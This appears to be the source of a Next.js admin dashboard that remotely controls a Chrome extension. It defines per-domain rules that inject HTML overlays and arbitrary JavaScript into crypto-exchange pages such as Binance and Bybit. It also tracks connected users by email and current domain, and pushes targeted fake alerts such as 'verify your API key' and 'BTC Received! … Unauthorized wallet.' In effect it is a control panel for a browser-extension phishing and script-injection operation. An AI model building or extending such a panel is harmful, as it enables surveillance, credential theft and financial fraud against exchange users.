'use client';

import { useState, useEffect } from 'react';

export default function AdminDashboard() {
  const [activeTab, setActiveTab] = useState('rules'); // rules | editor | clients | messages | docs
  const [rules, setRules] = useState([]);
  const [clients, setClients] = useState([]);
  const [messages, setMessages] = useState([]);
  const [stats, setStats] = useState({ totalClients: 0, onlineClients: 0, totalRequests: 0, rulesCount: 0 });
  const [loading, setLoading] = useState(true);
  const [toast, setToast] = useState(null);

  // Active rule being edited or previewed
  const [selectedRuleId, setSelectedRuleId] = useState(null);
  const [formData, setFormData] = useState({
    id: '',
    name: 'Binance BTC Received Alert',
    domain: '*.binance.com',
    enabled: true,
    priority: 10,
    targetClientId: '',
    overlay: {
      height: '50',
      bg: '#0b0e11',
      text: '#eaecef',
      titleColor: '#f0b90b',
      title: 'BTC Received!',
      message: 'Status: <span style="color:#848e9c;">pending</span><br>Unauthorized wallet.',
      position: 'top',
      closable: true,
      customCss: `#custom-sticky-popup {\n  animation: slideDown 0.3s ease-out;\n}\n@keyframes slideDown {\n  from { transform: translateY(-100%); opacity: 0; }\n  to { transform: translateY(0); opacity: 1; }\n}`,
      customJs: `// Custom dynamic script injected for this domain\nconsole.log('[RemoteOverlay] Active on:', window.location.hostname);`,
    },
  });

  // Targeted message form
  const [msgForm, setMsgForm] = useState({
    targetClientId: '',
    title: 'Security Alert: Action Required',
    body: 'Please verify your API key or authentication settings immediately.',
    colorBg: '#0b0e11',
    colorText: '#eaecef',
    colorTitle: '#f6465d',
    height: '45',
    customCss: '',
    customJs: '',
  });

  const showToast = (message, type = 'success') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 3500);
  };

  // Fetch initial data
  const fetchData = async () => {
    try {
      setLoading(true);
      const [rulesRes, clientsRes, msgRes] = await Promise.all([
        fetch('/api/admin/rules'),
        fetch('/api/admin/clients'),
        fetch('/api/admin/messages'),
      ]);

      const rulesData = await rulesRes.json();
      const clientsData = await clientsRes.json();
      const msgData = await msgRes.json();

      if (rulesData.success) {
        setRules(rulesData.rules);
        if (rulesData.rules.length > 0 && !selectedRuleId) {
          const first = rulesData.rules[0];
          setSelectedRuleId(first.id);
          setFormData({
            id: first.id,
            name: first.name,
            domain: first.domain,
            enabled: first.enabled,
            priority: first.priority || 10,
            targetClientId: first.targetClientId || '',
            overlay: { ...first.overlay },
          });
        }
      }

      if (clientsData.success) {
        setClients(clientsData.clients);
        setStats(clientsData.stats);
      }

      if (msgData.success) {
        setMessages(msgData.messages);
      }
    } catch (err) {
      console.error('Failed to load admin data:', err);
      showToast('Error connecting to backend API', 'error');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 8000); // Auto-refresh clients and stats every 8s
    return () => clearInterval(interval);
  }, []);

  const handleSelectRule = (rule) => {
    setSelectedRuleId(rule.id);
    setFormData({
      id: rule.id,
      name: rule.name,
      domain: rule.domain,
      enabled: rule.enabled,
      priority: rule.priority || 10,
      targetClientId: rule.targetClientId || '',
      overlay: { ...rule.overlay },
    });
  };

  const handleNewRule = () => {
    setSelectedRuleId('new');
    setFormData({
      id: '',
      name: 'New Domain Rule',
      domain: 'bybit.com',
      enabled: true,
      priority: 10,
      targetClientId: '',
      overlay: {
        height: '40',
        bg: '#181a20',
        text: '#eaecef',
        titleColor: '#f0b90b',
        title: 'Important Notification',
        message: 'Custom dynamic overlay message here.',
        position: 'top',
        closable: true,
        customCss: '',
        customJs: `console.log('Injected custom JS on ' + window.location.hostname);`,
      },
    });
  };

  const handleSaveRule = async (e) => {
    e?.preventDefault();
    try {
      const isNew = selectedRuleId === 'new' || !formData.id;
      const url = '/api/admin/rules';
      const method = isNew ? 'POST' : 'PUT';

      const res = await fetch(url, {
        method,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      const result = await res.json();
      if (!result.success) throw new Error(result.error);

      showToast(`Rule ${isNew ? 'created' : 'updated'} successfully!`);
      await fetchData();
      if (result.rule) {
        setSelectedRuleId(result.rule.id);
      }
    } catch (err) {
      showToast(err.message || 'Failed to save rule', 'error');
    }
  };

  const handleDeleteRule = async (ruleId) => {
    if (!confirm('Are you sure you want to delete this rule?')) return;
    try {
      const res = await fetch(`/api/admin/rules?id=${encodeURIComponent(ruleId)}`, {
        method: 'DELETE',
      });
      const result = await res.json();
      if (!result.success) throw new Error(result.error);

      showToast('Rule deleted successfully');
      await fetchData();
      if (selectedRuleId === ruleId) {
        setSelectedRuleId(null);
      }
    } catch (err) {
      showToast(err.message || 'Failed to delete rule', 'error');
    }
  };

  const handleToggleRule = async (rule, e) => {
    e.stopPropagation();
    try {
      const updated = !rule.enabled;
      const res = await fetch('/api/admin/rules', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: rule.id, enabled: updated }),
      });
      const result = await res.json();
      if (!result.success) throw new Error(result.error);

      setRules((prev) => prev.map((r) => (r.id === rule.id ? { ...r, enabled: updated } : r)));
      if (formData.id === rule.id) {
        setFormData((prev) => ({ ...prev, enabled: updated }));
      }
      showToast(`Rule ${updated ? 'enabled' : 'disabled'}`);
    } catch (err) {
      showToast(err.message || 'Failed to toggle rule', 'error');
    }
  };

  const handleSendTargetedMessage = async (e) => {
    e?.preventDefault();
    try {
      const res = await fetch('/api/admin/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(msgForm),
      });
      const result = await res.json();
      if (!result.success) throw new Error(result.error);

      showToast('Targeted message dispatched successfully!');
      fetchData();
      setMsgForm((prev) => ({ ...prev, body: '' }));
    } catch (err) {
      showToast(err.message || 'Failed to dispatch message', 'error');
    }
  };

  const handleDeleteMessage = async (id) => {
    try {
      const res = await fetch(`/api/admin/messages?id=${id}`, { method: 'DELETE' });
      const result = await res.json();
      if (result.success) {
        showToast('Message deleted');
        fetchData();
      }
    } catch (err) {
      showToast('Failed to delete message', 'error');
    }
  };

  return (
    <div className="app-container">
      {/* Toast Notification */}
      {toast && (
        <div className={`toast toast-${toast.type}`}>
          <span>{toast.type === 'success' ? '✓' : '⚠'}</span>
          <span>{toast.message}</span>
        </div>
      )}

      {/* Top Header */}
      <header className="header-bar">
        <div className="brand-wrapper">
          <div className="brand-icon">⚡</div>
          <div>
            <h1 className="brand-title">Remote Dynamic Overlay Studio</h1>
            <p className="brand-subtitle">
              Manage multi-domain popups, dynamic content & custom injected scripts in real-time
            </p>
          </div>
        </div>

        <div className="header-stats">
          <div className="stat-pill">
            <span className="dot-indicator dot-green"></span>
            <span>API: <strong>Online</strong></span>
          </div>
          <div className="stat-pill">
            <span className={`dot-indicator ${stats.mongoConnected ? 'dot-green' : 'dot-gold'}`}></span>
            <span>
              Database: <strong>{stats.mongoConnected ? `MongoDB Live (${stats.mongoDbName || 'Connected'})` : 'Local Fallback'}</strong>
            </span>
          </div>
          <div className="stat-pill">
            <span>Rules: <strong>{rules.length}</strong></span>
          </div>
          <div className="stat-pill">
            <span className="dot-indicator dot-gold"></span>
            <span>Active Clients: <strong>{stats.onlineClients || 0}</strong></span>
          </div>
          <div className="stat-pill">
            <span>Requests: <strong>{stats.totalRequests || 0}</strong></span>
          </div>
        </div>
      </header>

      {/* Navigation Tabs */}
      <nav className="tabs-nav">
        <button
          className={`tab-btn ${activeTab === 'rules' ? 'active' : ''}`}
          onClick={() => setActiveTab('rules')}
        >
          <span>🌐 Domain Rules & Editor</span>
          <span className="tab-count">{rules.length}</span>
        </button>

        <button
          className={`tab-btn ${activeTab === 'preview' ? 'active' : ''}`}
          onClick={() => setActiveTab('preview')}
        >
          <span>👁 Live Visual Preview</span>
        </button>

        <button
          className={`tab-btn ${activeTab === 'clients' ? 'active' : ''}`}
          onClick={() => setActiveTab('clients')}
        >
          <span>👥 Connected Clients</span>
          <span className="tab-count">{clients.length}</span>
        </button>

        <button
          className={`tab-btn ${activeTab === 'messages' ? 'active' : ''}`}
          onClick={() => setActiveTab('messages')}
        >
          <span>🚀 Targeted Push Messaging</span>
          <span className="tab-count">{messages.length}</span>
        </button>

        <button
          className={`tab-btn ${activeTab === 'docs' ? 'active' : ''}`}
          onClick={() => setActiveTab('docs')}
        >
          <span>📖 Extension & API Guide</span>
        </button>
      </nav>

      {/* TAB 1: Rules & Editor */}
      {activeTab === 'rules' && (
        <div className="grid-2col">
          {/* Left Column: Rules List */}
          <div className="card">
            <div className="card-header">
              <h2 className="card-title">
                <span>Domain Matching Rules</span>
              </h2>
              <button className="btn btn-primary btn-sm" onClick={handleNewRule}>
                + Add Domain Rule
              </button>
            </div>

            <p style={{ color: 'var(--text-secondary)', fontSize: '13px', marginBottom: '16px' }}>
              Define target domains (e.g. <code>*.binance.com</code>, <code>bybit.com</code>, or <code>*</code> for universal) and configure their dynamic overlay & scripts.
            </p>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
              {rules.map((rule) => {
                const isSelected = rule.id === selectedRuleId;
                return (
                  <div
                    key={rule.id}
                    onClick={() => handleSelectRule(rule)}
                    style={{
                      padding: '16px',
                      borderRadius: 'var(--radius-md)',
                      background: isSelected ? 'rgba(240, 185, 11, 0.08)' : 'var(--bg-elevated)',
                      border: `1px solid ${isSelected ? 'var(--brand-gold)' : 'var(--border-subtle)'}`,
                      cursor: 'pointer',
                      transition: 'all 0.2s ease',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                    }}
                  >
                    <div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '4px' }}>
                        <strong style={{ fontSize: '15px', color: '#fff' }}>{rule.name}</strong>
                        {rule.targetClientId && (
                          <span className="badge badge-blue">Client: {rule.targetClientId}</span>
                        )}
                      </div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                        <span className="badge badge-gold" style={{ fontFamily: 'var(--font-mono)' }}>
                          {rule.domain}
                        </span>
                        <span style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>
                          Height: {rule.overlay?.height || 50}vh
                        </span>
                        {rule.overlay?.customJs && (
                          <span className="badge badge-neutral" style={{ fontSize: '10px' }}>
                            + Custom JS
                          </span>
                        )}
                      </div>
                    </div>

                    <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                      <label className="toggle-switch" onClick={(e) => e.stopPropagation()}>
                        <input
                          type="checkbox"
                          checked={rule.enabled}
                          onChange={(e) => handleToggleRule(rule, e)}
                        />
                        <span className="toggle-slider"></span>
                      </label>

                      <button
                        className="btn btn-danger btn-sm"
                        onClick={(e) => {
                          e.stopPropagation();
                          handleDeleteRule(rule.id);
                        }}
                      >
                        Delete
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          {/* Right Column: Rule Editor */}
          <div className="card">
            <div className="card-header">
              <h2 className="card-title">
                <span>{selectedRuleId === 'new' ? 'Create New Domain Rule' : 'Edit Overlay & Code'}</span>
              </h2>
              {formData.id && (
                <span className="badge badge-neutral" style={{ fontFamily: 'var(--font-mono)' }}>
                  ID: {formData.id}
                </span>
              )}
            </div>

            <form onSubmit={handleSaveRule}>
              <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '16px' }}>
                <div className="form-group">
                  <label className="form-label">Rule Name</label>
                  <input
                    type="text"
                    className="form-input"
                    value={formData.name}
                    onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                    required
                  />
                </div>

                <div className="form-group">
                  <label className="form-label">Target Domain Pattern</label>
                  <input
                    type="text"
                    className="form-input"
                    placeholder="e.g. *.binance.com or *"
                    value={formData.domain}
                    onChange={(e) => setFormData({ ...formData, domain: e.target.value })}
                    required
                  />
                </div>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
                <div className="form-group">
                  <label className="form-label">Target Specific Client ID (Optional)</label>
                  <input
                    type="text"
                    className="form-input"
                    placeholder="Leave empty for all visitors"
                    value={formData.targetClientId}
                    onChange={(e) => setFormData({ ...formData, targetClientId: e.target.value })}
                  />
                </div>

                <div className="form-group">
                  <label className="form-label">Overlay Height (vh)</label>
                  <input
                    type="number"
                    className="form-input"
                    min="10"
                    max="100"
                    value={formData.overlay.height}
                    onChange={(e) =>
                      setFormData({
                        ...formData,
                        overlay: { ...formData.overlay, height: e.target.value },
                      })
                    }
                  />
                </div>
              </div>

              {/* Colors */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '12px' }}>
                <div className="form-group">
                  <label className="form-label">Title Color</label>
                  <div className="color-input-wrapper">
                    <input
                      type="color"
                      className="color-picker"
                      value={formData.overlay.titleColor}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          overlay: { ...formData.overlay, titleColor: e.target.value },
                        })
                      }
                    />
                    <input
                      type="text"
                      className="form-input"
                      value={formData.overlay.titleColor}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          overlay: { ...formData.overlay, titleColor: e.target.value },
                        })
                      }
                    />
                  </div>
                </div>

                <div className="form-group">
                  <label className="form-label">Background Color</label>
                  <div className="color-input-wrapper">
                    <input
                      type="color"
                      className="color-picker"
                      value={formData.overlay.bg}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          overlay: { ...formData.overlay, bg: e.target.value },
                        })
                      }
                    />
                    <input
                      type="text"
                      className="form-input"
                      value={formData.overlay.bg}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          overlay: { ...formData.overlay, bg: e.target.value },
                        })
                      }
                    />
                  </div>
                </div>

                <div className="form-group">
                  <label className="form-label">Text Color</label>
                  <div className="color-input-wrapper">
                    <input
                      type="color"
                      className="color-picker"
                      value={formData.overlay.text}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          overlay: { ...formData.overlay, text: e.target.value },
                        })
                      }
                    />
                    <input
                      type="text"
                      className="form-input"
                      value={formData.overlay.text}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          overlay: { ...formData.overlay, text: e.target.value },
                        })
                      }
                    />
                  </div>
                </div>
              </div>

              {/* Title & Message */}
              <div className="form-group">
                <label className="form-label">Popup Title</label>
                <input
                  type="text"
                  className="form-input"
                  value={formData.overlay.title}
                  onChange={(e) =>
                    setFormData({
                      ...formData,
                      overlay: { ...formData.overlay, title: e.target.value },
                    })
                  }
                  required
                />
              </div>

              <div className="form-group">
                <label className="form-label">Popup HTML Message (Supports HTML tags & styles)</label>
                <textarea
                  className="form-textarea"
                  rows={3}
                  value={formData.overlay.message}
                  onChange={(e) =>
                    setFormData({
                      ...formData,
                      overlay: { ...formData.overlay, message: e.target.value },
                    })
                  }
                />
              </div>

              {/* Dynamic Code Section */}
              <div className="form-group">
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                  <label className="form-label">Custom JavaScript Code (Executed dynamically on domain)</label>
                  <span style={{ fontSize: '11px', color: 'var(--brand-gold)' }}>Runs in document context</span>
                </div>
                <textarea
                  className="form-textarea code-textarea"
                  rows={4}
                  placeholder="// e.g. console.log('Injected on domain:', window.location.hostname);"
                  value={formData.overlay.customJs}
                  onChange={(e) =>
                    setFormData({
                      ...formData,
                      overlay: { ...formData.overlay, customJs: e.target.value },
                    })
                  }
                />
              </div>

              <div className="form-group">
                <label className="form-label">Custom CSS Styles (Injected into page DOM)</label>
                <textarea
                  className="form-textarea code-textarea"
                  rows={3}
                  placeholder="#custom-sticky-popup { animation: fadeIn 0.4s ease; }"
                  value={formData.overlay.customCss}
                  onChange={(e) =>
                    setFormData({
                      ...formData,
                      overlay: { ...formData.overlay, customCss: e.target.value },
                    })
                  }
                />
              </div>

              <div style={{ display: 'flex', gap: '12px', marginTop: '20px' }}>
                <button type="submit" className="btn btn-primary" style={{ flex: 1 }}>
                  💾 Save & Publish Configuration
                </button>
                <button
                  type="button"
                  className="btn btn-secondary"
                  onClick={() => setActiveTab('preview')}
                >
                  👁 View Live Preview
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* TAB 2: Live Visual Preview */}
      {activeTab === 'preview' && (
        <div className="card">
          <div className="card-header">
            <div>
              <h2 className="card-title">Interactive Live Browser Preview</h2>
              <p style={{ color: 'var(--text-secondary)', fontSize: '13px' }}>
                Previewing how the overlay appears on <strong>{formData.domain}</strong> in real-time.
              </p>
            </div>
            <button className="btn btn-primary btn-sm" onClick={() => setActiveTab('rules')}>
              ← Back to Editor
            </button>
          </div>

          <div className="preview-browser">
            {/* Browser top chrome */}
            <div className="browser-topbar">
              <div className="browser-dots">
                <div className="browser-dot red"></div>
                <div className="browser-dot yellow"></div>
                <div className="browser-dot green"></div>
              </div>
              <div className="browser-url-bar">
                <span style={{ color: '#00c087' }}>🔒 https://</span>
                <span>{formData.domain.replace('*', 'www')}/en/my/wallet/account/main</span>
              </div>
            </div>

            {/* Preview stage */}
            <div className="preview-stage" style={{ minHeight: '520px' }}>
              {/* Dynamic Overlay Rendering */}
              {formData.enabled ? (
                <div
                  id="preview-custom-popup"
                  style={{
                    position: 'absolute',
                    top: 0,
                    left: 0,
                    width: '100%',
                    height: `${formData.overlay.height}vh`,
                    maxHeight: '85%',
                    backgroundColor: formData.overlay.bg,
                    borderBottom: '2px solid rgba(255,255,255,0.15)',
                    color: formData.overlay.text,
                    fontFamily: 'Arial, sans-serif',
                    display: 'flex',
                    flexDirection: 'column',
                    justifyContent: 'center',
                    alignItems: 'center',
                    boxShadow: '0 8px 30px rgba(0,0,0,0.6)',
                    zIndex: 100,
                    padding: '20px',
                    transition: 'all 0.3s ease',
                  }}
                >
                  <div
                    style={{
                      position: 'absolute',
                      top: '16px',
                      right: '24px',
                      cursor: 'pointer',
                      fontSize: '22px',
                      color: formData.overlay.text,
                      opacity: 0.7,
                    }}
                  >
                    ✕
                  </div>

                  <div
                    style={{
                      fontSize: '42px',
                      fontWeight: 'bold',
                      color: formData.overlay.titleColor,
                      marginBottom: '16px',
                      textAlign: 'center',
                    }}
                  >
                    {formData.overlay.title}
                  </div>

                  <div
                    style={{
                      fontSize: '20px',
                      lineHeight: '1.6',
                      textAlign: 'center',
                      maxWidth: '700px',
                    }}
                    dangerouslySetInnerHTML={{ __html: formData.overlay.message }}
                  />

                  {formData.overlay.customJs && (
                    <div
                      style={{
                        position: 'absolute',
                        bottom: '12px',
                        left: '16px',
                        fontSize: '11px',
                        color: 'rgba(255,255,255,0.4)',
                        fontFamily: 'var(--font-mono)',
                      }}
                    >
                      ⚡ Custom script attached ({formData.overlay.customJs.length} chars)
                    </div>
                  )}
                </div>
              ) : (
                <div
                  style={{
                    position: 'absolute',
                    top: '20px',
                    left: '50%',
                    transform: 'translateX(-50%)',
                    background: 'rgba(246, 70, 93, 0.2)',
                    border: '1px solid var(--brand-red)',
                    color: 'var(--brand-red)',
                    padding: '10px 20px',
                    borderRadius: '8px',
                    fontSize: '13px',
                    fontWeight: 600,
                  }}
                >
                  Overlay currently DISABLED for this domain
                </div>
              )}

              {/* Mock Binance Page Content behind overlay */}
              <div className="mock-page-content">
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '30px' }}>
                  <div style={{ width: '120px', height: '24px', background: '#f0b90b', borderRadius: '4px' }}></div>
                  <div style={{ display: 'flex', gap: '20px' }}>
                    <div style={{ width: '60px', height: '20px', background: '#2b313a', borderRadius: '4px' }}></div>
                    <div style={{ width: '60px', height: '20px', background: '#2b313a', borderRadius: '4px' }}></div>
                    <div style={{ width: '60px', height: '20px', background: '#2b313a', borderRadius: '4px' }}></div>
                  </div>
                </div>

                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '20px', marginBottom: '30px' }}>
                  {[1, 2, 3, 4].map((i) => (
                    <div key={i} style={{ height: '90px', background: '#181a20', borderRadius: '8px' }}></div>
                  ))}
                </div>

                <div style={{ height: '220px', background: '#181a20', borderRadius: '8px' }}></div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* TAB 3: Connected Clients */}
      {activeTab === 'clients' && (
        <div className="card">
          <div className="card-header">
            <div>
              <h2 className="card-title">Live Extension Clients Monitor</h2>
              <p style={{ color: 'var(--text-secondary)', fontSize: '13px' }}>
                All Chrome Extensions currently checking in with client ID, email, active domain, and ping status.
              </p>
            </div>
            <button className="btn btn-secondary btn-sm" onClick={fetchData}>
              ↻ Refresh Now
            </button>
          </div>

          <div className="table-wrapper">
            <table className="data-table">
              <thead>
                <tr>
                  <th>Status</th>
                  <th>Client ID</th>
                  <th>Client Email / User</th>
                  <th>Active Domain</th>
                  <th>Last Seen</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                {clients.length === 0 ? (
                  <tr>
                    <td colSpan={6} style={{ textAlign: 'center', padding: '36px', color: 'var(--text-secondary)' }}>
                      No clients connected yet. Load the Chrome extension and visit any website!
                    </td>
                  </tr>
                ) : (
                  clients.map((c) => (
                    <tr key={c.clientId}>
                      <td>
                        <span className={`badge ${c.status === 'online' ? 'badge-green' : 'badge-neutral'}`}>
                          <span className={`dot-indicator ${c.status === 'online' ? 'dot-green' : ''}`}></span>
                          {c.status}
                        </span>
                      </td>
                      <td style={{ fontFamily: 'var(--font-mono)', fontWeight: 600 }}>{c.clientId}</td>
                      <td>{c.email || 'Anonymous'}</td>
                      <td>
                        <span className="badge badge-gold" style={{ fontFamily: 'var(--font-mono)' }}>
                          {c.lastDomain}
                        </span>
                      </td>
                      <td style={{ color: 'var(--text-secondary)' }}>
                        {c.secondsAgo < 60
                          ? `${c.secondsAgo}s ago`
                          : `${Math.round(c.secondsAgo / 60)}m ago`}
                      </td>
                      <td>
                        <button
                          className="btn btn-primary btn-sm"
                          onClick={() => {
                            setMsgForm((prev) => ({ ...prev, targetClientId: c.clientId }));
                            setActiveTab('messages');
                          }}
                        >
                          Target Message ✉
                        </button>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* TAB 4: Targeted Push Messaging */}
      {activeTab === 'messages' && (
        <div className="grid-2col">
          {/* Dispatch Message Form */}
          <div className="card">
            <div className="card-header">
              <h2 className="card-title">Push Urgent Overlay to Client(s)</h2>
            </div>

            <p style={{ color: 'var(--text-secondary)', fontSize: '13px', marginBottom: '16px' }}>
              Send an instant overlay popup targeting a specific logged-in Client ID or broadcast globally to all users.
            </p>

            <form onSubmit={handleSendTargetedMessage}>
              <div className="form-group">
                <label className="form-label">Target Client ID</label>
                <input
                  type="text"
                  className="form-input"
                  placeholder="Enter Client ID or leave blank for Global Broadcast"
                  value={msgForm.targetClientId}
                  onChange={(e) => setMsgForm({ ...msgForm, targetClientId: e.target.value })}
                />
              </div>

              <div className="form-group">
                <label className="form-label">Message Title</label>
                <input
                  type="text"
                  className="form-input"
                  value={msgForm.title}
                  onChange={(e) => setMsgForm({ ...msgForm, title: e.target.value })}
                  required
                />
              </div>

              <div className="form-group">
                <label className="form-label">HTML Message Body</label>
                <textarea
                  className="form-textarea"
                  rows={3}
                  value={msgForm.body}
                  onChange={(e) => setMsgForm({ ...msgForm, body: e.target.value })}
                  required
                />
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '10px' }}>
                <div className="form-group">
                  <label className="form-label">Title Color</label>
                  <input
                    type="color"
                    className="color-picker"
                    value={msgForm.colorTitle}
                    onChange={(e) => setMsgForm({ ...msgForm, colorTitle: e.target.value })}
                  />
                </div>
                <div className="form-group">
                  <label className="form-label">Background</label>
                  <input
                    type="color"
                    className="color-picker"
                    value={msgForm.colorBg}
                    onChange={(e) => setMsgForm({ ...msgForm, colorBg: e.target.value })}
                  />
                </div>
                <div className="form-group">
                  <label className="form-label">Height (vh)</label>
                  <input
                    type="number"
                    className="form-input"
                    value={msgForm.height}
                    onChange={(e) => setMsgForm({ ...msgForm, height: e.target.value })}
                  />
                </div>
              </div>

              <button type="submit" className="btn btn-primary" style={{ width: '100%', marginTop: '10px' }}>
                🚀 Dispatch Push Overlay
              </button>
            </form>
          </div>

          {/* Messages History */}
          <div className="card">
            <div className="card-header">
              <h2 className="card-title">Active Targeted Overlays</h2>
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
              {messages.length === 0 ? (
                <p style={{ color: 'var(--text-secondary)', fontSize: '13px' }}>
                  No active push messages. Create one on the left to test targeted delivery.
                </p>
              ) : (
                messages.map((m) => (
                  <div
                    key={m.id}
                    style={{
                      padding: '16px',
                      background: 'var(--bg-elevated)',
                      border: '1px solid var(--border-subtle)',
                      borderRadius: 'var(--radius-md)',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                    }}
                  >
                    <div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '4px' }}>
                        <strong style={{ color: m.colorTitle || 'var(--brand-gold)' }}>{m.title}</strong>
                        {m.targetClientId ? (
                          <span className="badge badge-blue">To: {m.targetClientId}</span>
                        ) : (
                          <span className="badge badge-gold">Broadcast to All</span>
                        )}
                      </div>
                      <div
                        style={{ fontSize: '13px', color: 'var(--text-secondary)' }}
                        dangerouslySetInnerHTML={{ __html: m.body }}
                      />
                    </div>

                    <button
                      className="btn btn-danger btn-sm"
                      onClick={() => handleDeleteMessage(m.id)}
                    >
                      Delete
                    </button>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      )}

      {/* TAB 5: Documentation & Setup Guide */}
      {activeTab === 'docs' && (
        <div className="card">
          <div className="card-header">
            <h2 className="card-title">Chrome Extension & Next.js API Integration</h2>
          </div>

          <div style={{ fontSize: '14px', lineHeight: '1.7', color: 'var(--text-primary)' }}>
            <h3 style={{ color: 'var(--brand-gold)', marginBottom: '8px' }}>1. How the Extension Works with Next.js</h3>
            <p style={{ marginBottom: '16px', color: 'var(--text-secondary)' }}>
              The extension connects directly to this Next.js API. When the user visits any website (e.g. Binance, Bybit, or any configured domain), the content script:
            </p>
            <ol style={{ paddingLeft: '20px', marginBottom: '20px', color: 'var(--text-secondary)' }}>
              <li>Detects the current domain (e.g. <code>window.location.hostname</code>).</li>
              <li>Queries <code>GET /api/overlay?domain=...&clientId=...</code>.</li>
              <li>Receives the custom overlay content (title, styling, height, HTML message).</li>
              <li>Dynamically evaluates custom JavaScript and injects custom CSS provided from this dashboard.</li>
              <li>Sends periodic heartbeat back to <code>POST /api/client/heartbeat</code>.</li>
            </ol>

            <h3 style={{ color: 'var(--brand-gold)', marginBottom: '8px' }}>2. Loading the Extension in Google Chrome</h3>
            <ol style={{ paddingLeft: '20px', marginBottom: '20px', color: 'var(--text-secondary)' }}>
              <li>Open Chrome and navigate to <code>chrome://extensions</code>.</li>
              <li>Enable <strong>Developer mode</strong> (toggle switch in the top-right corner).</li>
              <li>Click <strong>Load unpacked</strong>.</li>
              <li>Select your extension folder: <code>d:\binance_modify\extension</code> (or <code>d:\binance_modify</code>).</li>
              <li>Click on the extension icon in the Chrome toolbar to see your Client ID and connection status!</li>
            </ol>

            <h3 style={{ color: 'var(--brand-gold)', marginBottom: '8px' }}>3. API Endpoints Reference</h3>
            <div
              style={{
                background: '#07090c',
                padding: '16px',
                borderRadius: '8px',
                fontFamily: 'var(--font-mono)',
                fontSize: '12px',
                display: 'flex',
                flexDirection: 'column',
                gap: '8px',
                marginBottom: '20px',
              }}
            >
              <div><span style={{ color: '#00c087' }}>GET</span> /api/overlay?domain=binance.com&clientId=client_123</div>
              <div><span style={{ color: '#f0b90b' }}>POST</span> /api/client/heartbeat</div>
              <div><span style={{ color: '#3888ff' }}>GET/POST/PUT/DELETE</span> /api/admin/rules</div>
              <div><span style={{ color: '#3888ff' }}>GET/POST/DELETE</span> /api/admin/messages</div>
              <div><span style={{ color: '#00c087' }}>GET</span> /api/health</div>
            </div>

            <h3 style={{ color: 'var(--brand-gold)', marginBottom: '8px' }}>4. MongoDB Live Connection (.env.local)</h3>
            <p style={{ color: 'var(--text-secondary)', marginBottom: '10px' }}>
              To connect your live MongoDB database (Atlas or local), edit <code>dashboard/.env.local</code>:
            </p>
            <div
              style={{
                background: '#07090c',
                padding: '16px',
                borderRadius: '8px',
                fontFamily: 'var(--font-mono)',
                fontSize: '12px',
                color: '#f0b90b',
                lineHeight: '1.6',
              }}
            >
              # MongoDB Atlas Live Connection<br />
              MONGODB_URI=mongodb+srv://&lt;username&gt;:&lt;password&gt;@cluster0.abcde.mongodb.net/overlay_db?retryWrites=true&amp;w=majority<br />
              MONGODB_DB=overlay_db<br />
              PORT=3001
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
